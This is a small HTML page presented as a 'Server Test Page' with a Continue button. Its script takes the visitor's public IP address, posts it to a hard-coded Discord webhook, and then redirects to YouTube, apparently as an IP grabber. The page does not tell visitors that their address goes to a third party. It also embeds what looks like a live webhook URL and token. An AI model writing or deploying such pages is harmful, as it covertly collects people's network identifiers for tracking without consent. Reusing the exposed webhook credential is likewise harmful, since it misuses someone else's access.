<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>IP Test</title>
</head>
<body>
  <h2>Server Test Page</h2>
  <p>This will fetch your public IP and redirect.</p>
  <button id="go">Continue</button>

  <script>
    // ============ CONFIG ============
    const REDIRECT_LINK = "https://www.youtube.com";
    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1466362286951104643/Jsm9HpSe-2vh2eDLjFcoQLdug_4Fe-iOd5rSCNWIZPVGdisDj_gZl9M9fH_yWErJVwph";
    const IP_API = "https://api.ipify.org?format=json";
    // ================================

    document.getElementById("go").addEventListener("click", async () => {
      try {
        // Get public IP
        const res = await fetch(IP_API);
        const data = await res.json();
        const ip = data.ip;

        // Send to Discord
        await fetch(DISCORD_WEBHOOK, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            username: "IP Test",
            content: `Public IP: \`${ip}\``
          })
        });

      } catch (err) {
        console.error("Error:", err);
      }

      // Redirect (always happens)
      window.location.href = REDIRECT_LINK;
    });
  </script>
</body>
</html>
